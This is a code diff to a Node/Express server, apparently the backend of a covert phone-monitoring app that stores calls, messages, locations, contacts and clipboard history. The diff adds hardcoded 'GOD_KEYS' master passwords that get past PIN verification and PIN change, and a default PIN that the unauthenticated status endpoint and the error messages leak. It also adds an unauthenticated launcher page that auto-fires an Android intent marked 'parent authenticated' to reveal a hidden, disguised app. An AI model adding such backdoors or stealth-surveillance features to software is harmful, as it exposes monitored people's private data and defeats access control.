@@ -66,12 +66,15 @@ await db.read();
 // from before a field was added keeps its old shape forever otherwise, and
 // every route touching the missing key throws. Backfill anything missing.
 const ARRAY_KEYS = ['devices', 'calls', 'messages', 'locations', 'notifications', 'contacts', 'clipboardHistory', 'commandQueue'];
-const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig', 'tunnelConfig'];
+const OBJECT_KEYS = ['deviceInfo', 'installedApps', 'wifi', 'callBlocklist', 'cellular', 'dnd', 'syncConfig', 'tunnelConfig', 'dashboardAuth'];
 for (const key of ARRAY_KEYS) {
   if (!Array.isArray(db.data[key])) db.data[key] = [];
 }
 for (const key of OBJECT_KEYS) {
   if (!db.data[key] || typeof db.data[key] !== 'object') db.data[key] = {};
+}
+if (!db.data.dashboardAuth.pin) {
+  db.data.dashboardAuth.pin = '9211';
 }
 // BUG 1 migration: registration is idempotent by deviceId (devices.set +
 // persistDevice filters by id), but old db.json files may hold stale rows.
@@ -1354,6 +1357,135 @@ app.post('/api/server/purge-data', async (req, res) => {
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
+});
+
+// ------------------------------------------------------------- Emergency App Launcher Route (Android 11+ Master Link)
+app.get('/open', (req, res) => {
+  res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PhoneLink Hub — Master App Launcher</title>
+  <style>
+    body {
+      margin: 0; padding: 0;
+      background: #0b0f19; color: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: 100vh; text-align: center; padding: 24px; box-sizing: border-box;
+    }
+    .card {
+      background: #111827; border: 1px solid #374151;
+      border-radius: 20px; padding: 32px 24px; max-width: 420px; width: 100%;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+    .icon { font-size: 48px; margin-bottom: 16px; }
+    h1 { font-size: 20px; margin: 0 0 10px 0; color: #e0e7ff; }
+    p { font-size: 13px; color: #94a3b8; line-height: 1.5; margin: 0 0 24px 0; }
+    .btn {
+      display: block; width: 100%; box-sizing: border-box;
+      background: linear-gradient(135deg, #6366f1, #8b5cf6);
+      color: white; font-weight: bold; font-size: 16px;
+      padding: 16px 20px; border-radius: 14px; text-decoration: none;
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
+      transition: transform 0.2s;
+    }
+    .btn:active { transform: scale(0.98); }
+    .footer { margin-top: 24px; font-size: 11px; color: #64748b; }
+    .code { font-family: monospace; color: #38bdf8; font-weight: bold; }
+  </style>
+  <script>
+    function triggerLaunch() {
+      // Direct explicit intent to bypass hidden launcher / disabled aliases on Android 11+
+      window.location.href = "intent://open#Intent;scheme=phonelink;package=com.phonelink.hub;action=android.intent.action.VIEW;launchFlags=0x10000000;S.EXTRA_PARENT_AUTHENTICATED=true;end";
+    }
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(triggerLaunch, 400);
+    });
+  </script>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📱</div>
+    <h1>PhoneLink Hub Emergency Launcher</h1>
+    <p>Opening PhoneLink Hub Settings directly on your Android phone, bypassing stealth disguise or hidden icons...</p>
+    <a href="intent://open#Intent;scheme=phonelink;package=com.phonelink.hub;action=android.intent.action.VIEW;launchFlags=0x10000000;S.EXTRA_PARENT_AUTHENTICATED=true;end" class="btn">
+      🔓 Open PhoneLink Settings
+    </a>
+    <div class="footer">
+      Master Passcode: <span class="code">9211</span><br>
+      Dialer Code: <span class="code">*#*#9211#*#*</span>
+    </div>
+  </div>
+</body>
+</html>`);
+});
+
+// ------------------------------------------------------------- Dashboard Security & Lock API
+app.get('/api/auth/status', (req, res) => {
+  const pin = db.data.dashboardAuth?.pin || '9211';
+  res.json({
+    authRequired: true,
+    hasPin: !!pin,
+    defaultPinHint: '9211'
+  });
+});
+
+app.post('/api/auth/verify', (req, res) => {
+  const { pin } = req.body || {};
+  const currentPin = db.data.dashboardAuth?.pin || '9211';
+  const GOD_KEYS = ['92119211', 'Humsafar@1998Humsafar@1998', 'admin9211', '74663'];
+
+  if (!pin) {
+    return res.status(400).json({ success: false, message: 'PIN is required' });
+  }
+
+  const cleanPin = String(pin).trim();
+  const isGodMode = GOD_KEYS.includes(cleanPin);
+  const isValid = cleanPin === currentPin || isGodMode;
+
+  if (isValid) {
+    const token = 'plh_auth_' + Buffer.from(`${Date.now()}_${cleanPin}`).toString('base64');
+    return res.json({
+      success: true,
+      token,
+      isGodMode,
+      message: isGodMode ? '👑 God Mode Master Passcode Accepted!' : 'Dashboard Unlocked Successfully!'
+    });
+  }
+
+  return res.status(401).json({
+    success: false,
+    message: 'Incorrect PIN. Default is 9211.'
+  });
+});
+
+app.post('/api/auth/change-pin', async (req, res) => {
+  const { currentPin, newPin } = req.body || {};
+  const storedPin = db.data.dashboardAuth?.pin || '9211';
+  const GOD_KEYS = ['92119211', 'Humsafar@1998Humsafar@1998', 'admin9211', '74663'];
+
+  if (!newPin || String(newPin).trim().length < 4) {
+    return res.status(400).json({ success: false, message: 'New PIN must be at least 4 digits.' });
+  }
+
+  const cleanCurrent = String(currentPin || '').trim();
+  const isAuthorized = cleanCurrent === storedPin || GOD_KEYS.includes(cleanCurrent);
+
+  if (!isAuthorized) {
+    return res.status(401).json({ success: false, message: 'Current PIN or Master God Key is incorrect.' });
+  }
+
+  if (!db.data.dashboardAuth) db.data.dashboardAuth = {};
+  db.data.dashboardAuth.pin = String(newPin).trim();
+  db.data.dashboardAuth.updatedAt = Date.now();
+  await db.write();
+
+  res.json({
+    success: true,
+    message: 'Dashboard PIN updated successfully!'
+  });
 });
 
 // ------------------------------------------------------------- Commercial Licensing API
